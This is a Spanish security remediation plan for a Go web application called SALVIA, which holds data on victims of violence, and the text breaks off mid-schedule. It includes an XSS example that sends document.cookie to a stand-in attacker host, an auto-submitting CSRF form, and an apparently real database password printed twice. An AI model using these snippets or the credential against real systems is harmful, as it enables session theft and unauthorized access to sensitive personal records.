# Mejoras Urgentes de Seguridad - Sistema SALVIA
## Plan de Acción Inmediata

---

## 🔴 CRÍTICO 1: Credenciales Hardcodeadas

### Problema Actual
```json
// config/db_config.json
{
    "hostname":"localhost",
    "port":"5432",
    "database":"salvia",
    "user":"salvia_admin",
    "password":"asd876.!@asdSDS5a36Z"  // ❌ EXPUESTO EN REPOSITORIO
}
```

### ¿Por qué es crítico?
1. **Exposición en Control de Versiones**: Si el repositorio es comprometido o se hace público, las credenciales quedan expuestas
2. **Acceso No Autorizado**: Cualquiera con acceso al código puede conectarse a la base de datos
3. **Imposibilidad de Rotación**: Cambiar contraseñas requiere modificar código y redeployar
4. **Cumplimiento Normativo**: Viola RGPD, ENS (Esquema Nacional de Seguridad) y mejores prácticas
5. **Auditoría**: Las credenciales quedan en el historial de Git permanentemente

### Soluciones Propuestas

#### Solución 1: Variables de Entorno (Recomendada - Corto Plazo)

**Paso 1: Crear archivo .env (NO commitear)**
```bash
# .env
DB_HOSTNAME=localhost
DB_PORT=5432
DB_DATABASE=salvia
DB_USER=salvia_admin
DB_PASSWORD=asd876.!@asdSDS5a36Z
SESSION_SECRET=<generar-clave-aleatoria-32-bytes>
```

**Paso 2: Actualizar .gitignore**
```bash
# .gitignore
.env
config/db_config.json
*.key
*.crt
```

**Paso 3: Modificar código Go**
```go
// common/utils/config.go
package utils

import (
    "os"
    "github.com/joho/godotenv"
)

func LoadDBClientConfig() db.DBClientConfig {
    // Cargar .env en desarrollo
    godotenv.Load()
    
    return db.DBClientConfig{
        Hostname: getEnv("DB_HOSTNAME", "localhost"),
        Port:     getEnv("DB_PORT", "5432"),
        DatabaseName: getEnv("DB_DATABASE", "salvia"),
        UserName: getEnv("DB_USER", ""),
        Password: getEnv("DB_PASSWORD", ""),
    }
}

func getEnv(key, defaultValue string) string {
    if value := os.Getenv(key); value != "" {
        return value
    }
    return defaultValue
}
```

**Paso 4: Instalar dependencia**
```bash
go get github.com/joho/godotenv
```


#### Solución 2: HashiCorp Vault (Recomendada - Largo Plazo)

**Ventajas:**
- Rotación automática de credenciales
- Auditoría completa de accesos
- Cifrado en tránsito y reposo
- Gestión centralizada de secretos

**Implementación básica:**
```go
// common/utils/vault.go
package utils

import (
    vault "github.com/hashicorp/vault/api"
)

func GetDBCredentials() (db.DBClientConfig, error) {
    client, err := vault.NewClient(&vault.Config{
        Address: os.Getenv("VAULT_ADDR"),
    })
    if err != nil {
        return db.DBClientConfig{}, err
    }
    
    client.SetToken(os.Getenv("VAULT_TOKEN"))
    
    secret, err := client.Logical().Read("secret/data/salvia/database")
    if err != nil {
        return db.DBClientConfig{}, err
    }
    
    data := secret.Data["data"].(map[string]interface{})
    
    return db.DBClientConfig{
        Hostname:     data["hostname"].(string),
        Port:         data["port"].(string),
        DatabaseName: data["database"].(string),
        UserName:     data["user"].(string),
        Password:     data["password"].(string),
    }, nil
}
```

#### Solución 3: AWS Secrets Manager (Para AWS)

```go
// common/utils/aws_secrets.go
package utils

import (
    "encoding/json"
    "github.com/aws/aws-sdk-go/aws"
    "github.com/aws/aws-sdk-go/aws/session"
    "github.com/aws/aws-sdk-go/service/secretsmanager"
)

type DBSecret struct {
    Hostname string `json:"hostname"`
    Port     string `json:"port"`
    Database string `json:"database"`
    Username string `json:"username"`
    Password string `json:"password"`
}

func GetDBCredentialsFromAWS() (db.DBClientConfig, error) {
    sess := session.Must(session.NewSession())
    svc := secretsmanager.New(sess)
    
    input := &secretsmanager.GetSecretValueInput{
        SecretId: aws.String("salvia/database"),
    }
    
    result, err := svc.GetSecretValue(input)
    if err != nil {
        return db.DBClientConfig{}, err
    }
    
    var secret DBSecret
    json.Unmarshal([]byte(*result.SecretString), &secret)
    
    return db.DBClientConfig{
        Hostname:     secret.Hostname,
        Port:         secret.Port,
        DatabaseName: secret.Database,
        UserName:     secret.Username,
        Password:     secret.Password,
    }, nil
}
```

### Plan de Acción Inmediata
1. ✅ **HOY**: Eliminar `db_config.json` del repositorio
2. ✅ **HOY**: Añadir a `.gitignore`
3. ✅ **HOY**: Implementar variables de entorno
4. ✅ **ESTA SEMANA**: Rotar todas las contraseñas
5. ✅ **ESTE MES**: Evaluar Vault o Secrets Manager

---

## 🔴 CRÍTICO 2: Secret Key Débil para Sesiones

### Problema Actual
```go
// common/facades/MainRouter.go
store := cookie.NewStore([]byte("secret"))  // ❌ CLAVE TRIVIAL
```

### ¿Por qué es crítico?
1. **Falsificación de Sesiones**: Un atacante puede generar cookies válidas
2. **Secuestro de Sesión**: Puede suplantar identidad de cualquier usuario
3. **Acceso No Autorizado**: Bypass completo del sistema de autenticación
4. **Datos Sensibles**: Sistema maneja información de víctimas de violencia
5. **Responsabilidad Legal**: Compromiso de datos personales sensibles

### Impacto Real
```
Atacante con clave "secret" puede:
1. Crear cookie de administrador
2. Acceder a todos los casos de víctimas
3. Modificar/eliminar información crítica
4. Suplantar identidad de operadores
```

### Soluciones Propuestas

#### Solución 1: Generar Clave Aleatoria Segura

**Paso 1: Generar clave de 32 bytes**
```bash
# En terminal
openssl rand -base64 32
# Resultado ejemplo: 8Xui9vZpGcF2kR7nT4mL1qW5eY3hS6jD0aP9bN8cV2x=
```

**Paso 2: Almacenar en variable de entorno**
```bash
# .env
SESSION_SECRET=8Xui9vZpGcF2kR7nT4mL1qW5eY3hS6jD0aP9bN8cV2x=
```

**Paso 3: Modificar código**
```go
// common/facades/MainRouter.go
func InitRouter() *gin.Engine {
    // Cargar secret desde variable de entorno
    sessionSecret := os.Getenv("SESSION_SECRET")
    if sessionSecret == "" {
        log.Fatal("SESSION_SECRET no configurado")
    }
    
    store := cookie.NewStore([]byte(sessionSecret))
    
    store.Options(sessions.Options{
        MaxAge:   14400,
        HttpOnly: true,  // ✅ CAMBIAR A TRUE
        Secure:   true,
        SameSite: http.SameSiteStrictMode,  // ✅ CAMBIAR A STRICT
        Path:     "/",
    })
    
    router.Use(sessions.Sessions("salvia_session", store))
    // ...
}
```

#### Solución 2: Rotación Automática de Claves

```go
// common/utils/session_keys.go
package utils

import (
    "crypto/rand"
    "encoding/base64"
    "time"
)

type SessionKeyManager struct {
    currentKey  []byte
    previousKey []byte
    rotateAt    time.Time
}

func NewSessionKeyManager() *SessionKeyManager {
    return &SessionKeyManager{
        currentKey:  generateKey(),
        previousKey: nil,
        rotateAt:    time.Now().Add(24 * time.Hour),
    }
}

func generateKey() []byte {
    key := make([]byte, 32)
    rand.Read(key)
    return key
}

func (m *SessionKeyManager) GetKeys() [][]byte {
    if time.Now().After(m.rotateAt) {
        m.previousKey = m.currentKey
        m.currentKey = generateKey()
        m.rotateAt = time.Now().Add(24 * time.Hour)
    }
    
    if m.previousKey != nil {
        return [][]byte{m.currentKey, m.previousKey}
    }
    return [][]byte{m.currentKey}
}

// Uso en MainRouter.go
var keyManager = utils.NewSessionKeyManager()

func InitRouter() *gin.Engine {
    store := cookie.NewStore(keyManager.GetKeys()...)
    // ...
}
```

### Plan de Acción Inmediata
1. ✅ **HOY**: Generar nueva clave aleatoria
2. ✅ **HOY**: Configurar en variable de entorno
3. ✅ **HOY**: Actualizar código
4. ✅ **HOY**: Reiniciar aplicación (invalida sesiones existentes)
5. ✅ **ESTA SEMANA**: Implementar rotación automática

---

## 🔴 CRÍTICO 3: Configuración Insegura de Cookies

### Problema Actual
```go
store.Options(sessions.Options{
    MaxAge:   14400,
    HttpOnly: false,  // ❌ VULNERABLE A XSS
    Secure:   true,
    SameSite: http.SameSiteDefaultMode,  // ❌ VULNERABLE A CSRF
    Path:     "/",
})
```

### ¿Por qué es crítico?

#### 3.1 HttpOnly: false
**Riesgo:** Ataques XSS (Cross-Site Scripting)

```javascript
// Atacante puede inyectar JavaScript y robar cookies
<script>
    fetch('https://atacante.com/steal?cookie=' + document.cookie);
</script>
```

**Impacto:**
- Robo de sesiones de usuarios
- Acceso a datos sensibles de víctimas
- Suplantación de identidad

#### 3.2 SameSite: Default
**Riesgo:** Ataques CSRF (Cross-Site Request Forgery)

```html
<!-- Atacante crea página maliciosa -->
<form action="https://salvia.gob.es/caso-victima" method="POST">
    <input name="status" value="cerrado">
</form>
<script>document.forms[0].submit();</script>
```

**Impacto:**
- Modificación no autorizada de casos
- Cierre fraudulento de expedientes
- Alteración de datos críticos

### Soluciones Propuestas

#### Configuración Segura Completa

```go
// common/facades/MainRouter.go
func InitRouter() *gin.Engine {
    sessionSecret := os.Getenv("SESSION_SECRET")
    if sessionSecret == "" {
        log.Fatal("SESSION_SECRET no configurado")
    }
    
    store := cookie.NewStore([]byte(sessionSecret))
    
    // ✅ CONFIGURACIÓN SEGURA
    store.Options(sessions.Options{
        MaxAge:   14400,                      // 4 horas
        HttpOnly: true,                       // ✅ Protege contra XSS
        Secure:   true,                       // ✅ Solo HTTPS
        SameSite: http.SameSiteStrictMode,   // ✅ Protege contra CSRF
        Path:     "/",
        Domain:   "",                         // Específico del dominio
    })
    
    router.Use(sessions.Sessions("salvia_session", store))
    
    // ✅ AÑADIR MIDDLEWARE CSRF
    router.Use(csrfMiddleware())
    
    return router
}
```

#### Implementar Protección CSRF

```go
// common/middleware/csrf.go
package middleware

import (
    "crypto/rand"
    "encoding/base64"
    "github.com/gin-contrib/sessions"
    "github.com/gin-gonic/gin"
    "net/http"
)

func CSRFMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        session := sessions.Default(c)
        
        // Generar token CSRF si no existe
        if session.Get("csrf_token") == nil {
            token := generateCSRFToken()
            session.Set("csrf_token", token)
            session.Save()
        }
        
        // Validar token en peticiones POST/PUT/DELETE
        if c.Request.Method != "GET" && c.Request.Method != "HEAD" {
            sessionToken := session.Get("csrf_token")
            requestToken := c.GetHeader("X-CSRF-Token")
            
            if sessionToken == nil || sessionToken != requestToken {
                c.JSON(http.StatusForbidden, gin.H{
                    "error": "Token CSRF inválido",
                })
                c.Abort()
                return
            }
        }
        
        c.Next()
    }
}

func generateCSRFToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return base64.URLEncoding.EncodeToString(b)
}
```

#### Actualizar Frontend

```javascript
// frontend/js/dao.js
class DAO {
    async post(url, data) {
        const csrfToken = this.getCSRFToken();
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': csrfToken  // ✅ Incluir token
            },
            body: JSON.stringify(data),
            credentials: 'same-origin'
        });
        
        return response.json();
    }
    
    getCSRFToken() {
        // Obtener token del meta tag o cookie
        return document.querySelector('meta[name="csrf-token"]')?.content;
    }
}
```

### Plan de Acción Inmediata
1. ✅ **HOY**: Cambiar `HttpOnly: true`
2. ✅ **HOY**: Cambiar `SameSite: Strict`
3. ✅ **MAÑANA**: Implementar middleware CSRF
4. ✅ **ESTA SEMANA**: Actualizar frontend con tokens CSRF
5. ✅ **ESTA SEMANA**: Probar exhaustivamente

---


## 🔴 CRÍTICO 4: Gestión de Sesiones en Memoria

### Problema Actual
```go
// common/utils/CommonSession.go
var sessions map[string]CommonSession = map[string]CommonSession{}

func AddCommonSession(sessionId string, commonSession CommonSession) {
    sessions[sessionId] = commonSession  // ❌ ALMACENADO EN MEMORIA
}
```

### ¿Por qué es crítico?

#### 4.1 Pérdida de Sesiones
```
Servidor reinicia → Todas las sesiones se pierden
↓
Usuarios deben volver a autenticarse
↓
Pérdida de trabajo en progreso
↓
Mala experiencia de usuario
```

#### 4.2 No Escalable
```
1 servidor con 1000 usuarios activos = OK
2 servidores con load balancer = ❌ FALLA

Usuario autenticado en Servidor A
↓
Siguiente petición va a Servidor B
↓
Servidor B no tiene la sesión
↓
Usuario aparece como no autenticado
```

#### 4.3 Consumo de Memoria
```go
// Cada sesión ocupa ~2KB
1000 usuarios = 2MB
10,000 usuarios = 20MB
100,000 usuarios = 200MB  // ❌ PROBLEMA
```

#### 4.4 Sin Persistencia
- No hay backup de sesiones
- Imposible auditar sesiones históricas
- No se puede detectar sesiones anómalas

### Soluciones Propuestas

#### Solución 1: Redis (Recomendada)

**Ventajas:**
- Persistencia en disco
- Escalabilidad horizontal
- TTL automático
- Clustering nativo
- Velocidad (in-memory)

**Paso 1: Instalar Redis**
```bash
# Docker
docker run -d -p 6379:6379 redis:7-alpine

# O instalación nativa
sudo apt-get install redis-server
```

**Paso 2: Instalar dependencia Go**
```bash
go get github.com/gin-contrib/sessions/redis
go get github.com/redis/go-redis/v9
```

**Paso 3: Modificar código**
```go
// common/facades/MainRouter.go
package common_facades

import (
    "github.com/gin-contrib/sessions"
    "github.com/gin-contrib/sessions/redis"
    "github.com/gin-gonic/gin"
    "os"
)

func InitRouter() *gin.Engine {
    router := gin.Default()
    
    // ✅ USAR REDIS PARA SESIONES
    redisAddr := os.Getenv("REDIS_ADDR")
    if redisAddr == "" {
        redisAddr = "localhost:6379"
    }
    
    redisPassword := os.Getenv("REDIS_PASSWORD")
    sessionSecret := os.Getenv("SESSION_SECRET")
    
    store, err := redis.NewStore(
        10,                    // Pool size
        "tcp",                 // Network
        redisAddr,             // Address
        redisPassword,         // Password
        []byte(sessionSecret), // Secret key
    )
    
    if err != nil {
        log.Fatal("Error conectando a Redis:", err)
    }
    
    store.Options(sessions.Options{
        MaxAge:   14400,
        HttpOnly: true,
        Secure:   true,
        SameSite: http.SameSiteStrictMode,
        Path:     "/",
    })
    
    router.Use(sessions.Sessions("salvia_session", store))
    
    return router
}
```

**Paso 4: Migrar CommonSession a Redis**
```go
// common/utils/CommonSession.go
package utils

import (
    "context"
    "encoding/json"
    "time"
    "github.com/redis/go-redis/v9"
)

var redisClient *redis.Client
var ctx = context.Background()

func InitRedis() {
    redisClient = redis.NewClient(&redis.Options{
        Addr:     os.Getenv("REDIS_ADDR"),
        Password: os.Getenv("REDIS_PASSWORD"),
        DB:       0,
    })
    
    // Verificar conexión
    _, err := redisClient.Ping(ctx).Result()
    if err != nil {
        log.Fatal("Error conectando a Redis:", err)
    }
}

func AddCommonSession(sessionId string, commonSession CommonSession) error {
    data, err := json.Marshal(commonSession)
    if err != nil {
        return err
    }
    
    // ✅ GUARDAR EN REDIS CON TTL
    return redisClient.Set(
        ctx,
        "session:"+sessionId,
        data,
        4*time.Hour,  // TTL de 4 horas
    ).Err()
}

func GetCommonSession(sessionId string) (CommonSession, error) {
    var session CommonSession
    
    // ✅ OBTENER DE REDIS
    data, err := redisClient.Get(ctx, "session:"+sessionId).Result()
    if err == redis.Nil {
        return session, errors.New("sesión no encontrada")
    }
    if err != nil {
        return session, err
    }
    
    err = json.Unmarshal([]byte(data), &session)
    return session, err
}

func DeleteCommonSession(sessionId string) error {
    // ✅ ELIMINAR DE REDIS
    return redisClient.Del(ctx, "session:"+sessionId).Err()
}

// ✅ NUEVA FUNCIÓN: Listar sesiones activas
func GetActiveSessions() ([]string, error) {
    keys, err := redisClient.Keys(ctx, "session:*").Result()
    if err != nil {
        return nil, err
    }
    
    sessions := make([]string, len(keys))
    for i, key := range keys {
        sessions[i] = strings.TrimPrefix(key, "session:")
    }
    
    return sessions, nil
}
```

**Paso 5: Configurar variables de entorno**
```bash
# .env
REDIS_ADDR=localhost:6379
REDIS_PASSWORD=
SESSION_SECRET=<tu-clave-secreta>
```

#### Solución 2: PostgreSQL (Alternativa)

**Ventajas:**
- Ya tienes PostgreSQL
- No requiere nueva infraestructura
- Auditoría completa

**Desventajas:**
- Más lento que Redis
- Mayor carga en BD

```go
// common/utils/session_db.go
package utils

import (
    "database/sql"
    "encoding/json"
    "time"
)

func AddCommonSession(sessionId string, commonSession CommonSession) error {
    data, _ := json.Marshal(commonSession)
    
    query := `
        INSERT INTO sessions (session_id, data, expires_at)
        VALUES ($1, $2, $3)
        ON CONFLICT (session_id) 
        DO UPDATE SET data = $2, expires_at = $3
    `
    
    expiresAt := time.Now().Add(4 * time.Hour)
    _, err := db.Exec(query, sessionId, data, expiresAt)
    return err
}

func GetCommonSession(sessionId string) (CommonSession, error) {
    var session CommonSession
    var data []byte
    
    query := `
        SELECT data FROM sessions 
        WHERE session_id = $1 AND expires_at > NOW()
    `
    
    err := db.QueryRow(query, sessionId).Scan(&data)
    if err != nil {
        return session, err
    }
    
    json.Unmarshal(data, &session)
    return session, nil
}

// Crear tabla
/*
CREATE TABLE sessions (
    session_id VARCHAR(255) PRIMARY KEY,
    data JSONB NOT NULL,
    expires_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT NOW()
);

CREATE INDEX idx_sessions_expires ON sessions(expires_at);
*/
```

### Plan de Acción Inmediata
1. ✅ **ESTA SEMANA**: Instalar Redis en desarrollo
2. ✅ **ESTA SEMANA**: Implementar integración Redis
3. ✅ **ESTA SEMANA**: Migrar sesiones a Redis
4. ✅ **PRÓXIMA SEMANA**: Probar en staging
5. ✅ **PRÓXIMA SEMANA**: Desplegar en producción

---

## 🔴 CRÍTICO 5: Sin Manejo Robusto de Errores

### Problema Actual
```go
// main.go
func main() {
    var router *gin.Engine = common_routers.InitRouter()
    salvia_facades.StartRouter(router)
    security_routers.StartRouter(router)
    
    common_routers.StartRouter()  // ❌ Sin manejo de errores
}

// common/facades/MainRouter.go
func StartRouter() {
    err := router.RunTLS(":443", "certs/salviaTest.crt", "certs/salviaTest.key")
    println(err)  // ❌ Solo imprime, no maneja
}
```

### ¿Por qué es crítico?

#### 5.1 Fallos Silenciosos
```
Certificado SSL expira
↓
Aplicación falla al iniciar
↓
println(err) imprime error
↓
Proceso termina sin notificación
↓
Servicio caído sin alertas
```

#### 5.2 Sin Observabilidad
- No hay logs estructurados
- Imposible debuggear en producción
- No hay métricas de errores
- Sin alertas automáticas

#### 5.3 Información Sensible Expuesta
```go
// Ejemplo de error expuesto al usuario
c.JSON(500, gin.H{
    "error": err.Error(),  // ❌ Puede exponer rutas, queries SQL, etc.
})
```

### Soluciones Propuestas

#### Solución 1: Logging Estructurado con Zap

**Paso 1: Instalar dependencia**
```bash
go get go.uber.org/zap
```

**Paso 2: Configurar logger global**
```go
// common/utils/logger.go
package utils

import (
    "go.uber.org/zap"
    "go.uber.org/zap"
    "os"
)

var Logger *zap.Logger

func InitLogger() {
    var err error
    
    if os.Getenv("ENV") == "production" {
        // ✅ Producción: JSON estructurado
        Logger, err = zap.NewProduction()
    } else {
        // ✅ Desarrollo: Formato legible
        Logger, err = zap.NewDevelopment()
    }
    
    if err != nil {
        panic("Error inicializando logger: " + err.Error())
    }
    
    defer Logger.Sync()
}

// Funciones helper
func LogError(msg string, err error, fields ...zap.Field) {
    allFields := append(fields, zap.Error(err))
    Logger.Error(msg, allFields...)
}

func LogInfo(msg string, fields ...zap.Field) {
    Logger.Info(msg, fields...)
}

func LogWarn(msg string, fields ...zap.Field) {
    Logger.Warn(msg, fields...)
}
```

**Paso 3: Usar en main.go**
```go
// main.go
package main

import (
    "bitsflow/common/utils"
    common_routers "bitsflow/common/facades"
    salvia_facades "bitsflow/salvia/facades"
    security_routers "bitsflow/security/facades"
    "go.uber.org/zap"
    "os"
    "os/signal"
    "syscall"
)

func main() {
    // ✅ INICIALIZAR LOGGER
    utils.InitLogger()
    defer utils.Logger.Sync()
    
    utils.LogInfo("Iniciando aplicación SALVIA",
        zap.String("version", "1.0.0"),
        zap.String("env", os.Getenv("ENV")),
    )
    
    // ✅ INICIALIZAR ROUTER CON MANEJO DE ERRORES
    router, err := common_routers.InitRouter()
    if err != nil {
        utils.LogError("Error inicializando router", err)
        os.Exit(1)
    }
    
    // ✅ REGISTRAR RUTAS
    if err := salvia_facades.StartRouter(router); err != nil {
        utils.LogError("Error registrando rutas Salvia", err)
        os.Exit(1)
    }
    
    if err := security_routers.StartRouter(router); err != nil {
        utils.LogError("Error registrando rutas Security", err)
        os.Exit(1)
    }
    
    // ✅ GRACEFUL SHUTDOWN
    go func() {
        if err := common_routers.StartRouter(router); err != nil {
            utils.LogError("Error iniciando servidor", err,
                zap.String("port", "443"),
            )
            os.Exit(1)
        }
    }()
    
    // ✅ ESPERAR SEÑAL DE TERMINACIÓN
    quit := make(chan os.Signal, 1)
    signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
    <-quit
    
    utils.LogInfo("Apagando servidor gracefully...")
    
    // Aquí iría lógica de cierre limpio
    // - Cerrar conexiones DB
    // - Finalizar requests en curso
    // - Guardar estado
    
    utils.LogInfo("Servidor detenido")
}
```

**Paso 4: Middleware de logging**
```go
// common/middleware/logging.go
package middleware

import (
    "bitsflow/common/utils"
    "github.com/gin-gonic/gin"
    "go.uber.org/zap"
    "time"
)

func LoggingMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        start := time.Now()
        path := c.Request.URL.Path
        query := c.Request.URL.RawQuery
        
        c.Next()
        
        // ✅ LOG ESTRUCTURADO DE CADA REQUEST
        latency := time.Since(start)
        
        utils.Logger.Info("HTTP Request",
            zap.String("method", c.Request.Method),
            zap.String("path", path),
            zap.String("query", query),
            zap.Int("status", c.Writer.Status()),
            zap.Duration("latency", latency),
            zap.String("ip", c.ClientIP()),
            zap.String("user_agent", c.Request.UserAgent()),
            zap.Int("body_size", c.Writer.Size()),
        )
        
        // ✅ LOG DE ERRORES
        if len(c.Errors) > 0 {
            for _, e := range c.Errors {
                utils.LogError("Request error", e.Err,
                    zap.String("path", path),
                    zap.String("method", c.Request.Method),
                )
            }
        }
    }
}
```

**Paso 5: Manejo de errores en facades**
```go
// salvia/facades/VictimContactFacade.go
func VictimContactPOST(c *gin.Context) {
    session := sessions.Default(c)
    sessionID, ok := session.Get("userData").(string)
    if !ok {
        utils.LogWarn("Sesión inválida",
            zap.String("ip", c.ClientIP()),
        )
        c.JSON(401, gin.H{"error": "Sesión inválida"})
        return
    }
    
    s, err := utils.GetCommonSession(sessionID)
    if err != nil {
        utils.LogError("Error obteniendo sesión", err,
            zap.String("session_id", sessionID),
        )
        c.JSON(500, gin.H{"error": "Error interno"})  // ✅ Mensaje genérico
        return
    }
    
    if !utils.CheckPermission(salvia_config.PermissionsByRole, "set_victim_contact", s.CurrentRole, c) {
        utils.LogWarn("Permiso denegado",
            zap.String("user", s.Names),
            zap.String("role", s.CurrentRole),
            zap.String("permission", "set_victim_contact"),
        )
        return
    }
    
    buf := new(bytes.Buffer)
    if _, err := buf.ReadFrom(c.Request.Body); err != nil {
        utils.LogError("Error leyendo body", err)
        c.JSON(400, gin.H{"error": "Datos inválidos"})
        return
    }
    
    code, res := salvia_ctrl.SetVictimContact(
        buf.String(), 
        "salvia", 
        &db.ConnData{}, 
        dbClientConfig, 
        dbServerConfig,
    )
    
    if code != 200 {
        utils.LogError("Error creando contacto", nil,
            zap.Int("status_code", code),
            zap.String("user", s.Names),
        )
    } else {
        utils.LogInfo("Contacto creado exitosamente",
            zap.String("user", s.Names),
            zap.String("role", s.CurrentRole),
        )
    }
    
    c.DataFromReader(code, int64(len(res)), gin.MIMEJSON, strings.NewReader(res), nil)
}
```


#### Solución 2: Middleware de Recovery

```go
// common/middleware/recovery.go
package middleware

import (
    "bitsflow/common/utils"
    "github.com/gin-gonic/gin"
    "go.uber.org/zap"
    "net/http"
    "runtime/debug"
)

func RecoveryMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        defer func() {
            if err := recover(); err != nil {
                // ✅ CAPTURAR PANIC Y LOGGEAR
                utils.LogError("Panic recuperado", nil,
                    zap.Any("error", err),
                    zap.String("path", c.Request.URL.Path),
                    zap.String("method", c.Request.Method),
                    zap.String("stack", string(debug.Stack())),
                )
                
                // ✅ RESPUESTA GENÉRICA AL USUARIO
                c.JSON(http.StatusInternalServerError, gin.H{
                    "error": "Error interno del servidor",
                })
                
                c.Abort()
            }
        }()
        
        c.Next()
    }
}
```

#### Solución 3: Integración con Sentry (Monitoreo de Errores)

```bash
go get github.com/getsentry/sentry-go
```

```go
// common/utils/sentry.go
package utils

import (
    "github.com/getsentry/sentry-go"
    "time"
)

func InitSentry() error {
    return sentry.Init(sentry.ClientOptions{
        Dsn: os.Getenv("SENTRY_DSN"),
        Environment: os.Getenv("ENV"),
        Release: "salvia@1.0.0",
        TracesSampleRate: 1.0,
    })
}

func CaptureError(err error, context map[string]interface{}) {
    sentry.WithScope(func(scope *sentry.Scope) {
        for key, value := range context {
            scope.SetContext(key, value)
        }
        sentry.CaptureException(err)
    })
}

// Middleware
func SentryMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        hub := sentry.CurrentHub().Clone()
        hub.Scope().SetRequest(c.Request)
        c.Set("sentry_hub", hub)
        
        defer func() {
            if err := recover(); err != nil {
                hub.RecoverWithContext(c, err)
                c.AbortWithStatus(500)
            }
        }()
        
        c.Next()
    }
}
```

### Plan de Acción Inmediata
1. ✅ **HOY**: Implementar logging estructurado
2. ✅ **HOY**: Añadir middleware de recovery
3. ✅ **MAÑANA**: Revisar todos los puntos de error
4. ✅ **ESTA SEMANA**: Configurar Sentry o similar
5. ✅ **ESTA SEMANA**: Implementar graceful shutdown

---

## 🟡 ADICIONALES IMPORTANTES

### 6. Rate Limiting por Usuario

**Problema:** Límite global de 9999 peticiones permite abuso

```go
// common/middleware/rate_limit.go
package middleware

import (
    "github.com/gin-gonic/gin"
    "golang.org/x/time/rate"
    "net/http"
    "sync"
)

type RateLimiter struct {
    limiters map[string]*rate.Limiter
    mu       sync.RWMutex
    rate     rate.Limit
    burst    int
}

func NewRateLimiter(r rate.Limit, b int) *RateLimiter {
    return &RateLimiter{
        limiters: make(map[string]*rate.Limiter),
        rate:     r,
        burst:    b,
    }
}

func (rl *RateLimiter) getLimiter(key string) *rate.Limiter {
    rl.mu.Lock()
    defer rl.mu.Unlock()
    
    limiter, exists := rl.limiters[key]
    if !exists {
        limiter = rate.NewLimiter(rl.rate, rl.burst)
        rl.limiters[key] = limiter
    }
    
    return limiter
}

func (rl *RateLimiter) Middleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // Usar IP + User ID como clave
        key := c.ClientIP()
        if userID, exists := c.Get("user_id"); exists {
            key = userID.(string)
        }
        
        limiter := rl.getLimiter(key)
        
        if !limiter.Allow() {
            utils.LogWarn("Rate limit excedido",
                zap.String("key", key),
                zap.String("path", c.Request.URL.Path),
            )
            
            c.JSON(http.StatusTooManyRequests, gin.H{
                "error": "Demasiadas peticiones, intente más tarde",
            })
            c.Abort()
            return
        }
        
        c.Next()
    }
}

// Uso en InitRouter
var rateLimiter = NewRateLimiter(10, 20)  // 10 req/s, burst 20
router.Use(rateLimiter.Middleware())
```

### 7. Validación de Entrada Mejorada

```go
// common/middleware/input_validation.go
package middleware

import (
    "github.com/gin-gonic/gin"
    "net/http"
    "strings"
)

func InputValidationMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // ✅ Validar tamaño de body
        if c.Request.ContentLength > 10*1024*1024 {  // 10MB
            c.JSON(http.StatusRequestEntityTooLarge, gin.H{
                "error": "Payload demasiado grande",
            })
            c.Abort()
            return
        }
        
        // ✅ Validar Content-Type
        contentType := c.GetHeader("Content-Type")
        if c.Request.Method == "POST" || c.Request.Method == "PUT" {
            if !strings.Contains(contentType, "application/json") &&
               !strings.Contains(contentType, "multipart/form-data") {
                c.JSON(http.StatusUnsupportedMediaType, gin.H{
                    "error": "Content-Type no soportado",
                })
                c.Abort()
                return
            }
        }
        
        c.Next()
    }
}
```

### 8. Headers de Seguridad

```go
// common/middleware/security_headers.go
package middleware

import (
    "github.com/gin-gonic/gin"
)

func SecurityHeadersMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // ✅ Prevenir clickjacking
        c.Header("X-Frame-Options", "DENY")
        
        // ✅ Prevenir MIME sniffing
        c.Header("X-Content-Type-Options", "nosniff")
        
        // ✅ XSS Protection
        c.Header("X-XSS-Protection", "1; mode=block")
        
        // ✅ Content Security Policy
        c.Header("Content-Security-Policy", 
            "default-src 'self'; "+
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'; "+
            "style-src 'self' 'unsafe-inline'; "+
            "img-src 'self' data: https:; "+
            "font-src 'self' data:; "+
            "connect-src 'self'")
        
        // ✅ Referrer Policy
        c.Header("Referrer-Policy", "strict-origin-when-cross-origin")
        
        // ✅ Permissions Policy
        c.Header("Permissions-Policy", 
            "geolocation=(), microphone=(), camera=()")
        
        // ✅ HSTS (HTTP Strict Transport Security)
        c.Header("Strict-Transport-Security", 
            "max-age=31536000; includeSubDomains; preload")
        
        c.Next()
    }
}
```

---

## 📋 PLAN DE IMPLEMENTACIÓN COMPLETO

### Semana 1 (URGENTE)
- [ ] **Día 1-2**: Credenciales a variables de entorno
  - Crear `.env`
  - Actualizar `.gitignore`
  - Modificar código para usar `os.Getenv()`
  - Rotar todas las contraseñas
  
- [ ] **Día 2-3**: Secret key segura
  - Generar clave aleatoria de 32 bytes
  - Configurar en variable de entorno
  - Actualizar código
  
- [ ] **Día 3-4**: Configuración segura de cookies
  - `HttpOnly: true`
  - `SameSite: Strict`
  - Implementar middleware CSRF
  
- [ ] **Día 4-5**: Logging estructurado
  - Instalar Zap
  - Configurar logger global
  - Añadir middleware de logging
  - Añadir middleware de recovery

### Semana 2
- [ ] **Día 1-2**: Redis para sesiones
  - Instalar Redis
  - Implementar integración
  - Migrar sesiones
  
- [ ] **Día 3-4**: Rate limiting
  - Implementar por usuario/IP
  - Configurar límites apropiados
  
- [ ] **Día 5**: Headers de seguridad
  - Implementar middleware
  - Probar con herramientas (securityheaders.com)

### Semana 3
- [ ] **Día 1-2**: Validación de entrada
  - Centralizar validaciones
  - Añadir sanitización
  
- [ ] **Día 3-4**: Monitoreo de errores
  - Configurar Sentry o alternativa
  - Integrar con código
  
- [ ] **Día 5**: Testing
  - Pruebas de seguridad
  - Pruebas de carga
  - Pruebas de penetración básicas

### Semana 4
- [ ] **Día 1-2**: Documentación
  - Actualizar README
  - Documentar configuración
  - Guías de despliegue
  
- [ ] **Día 3-4**: Staging
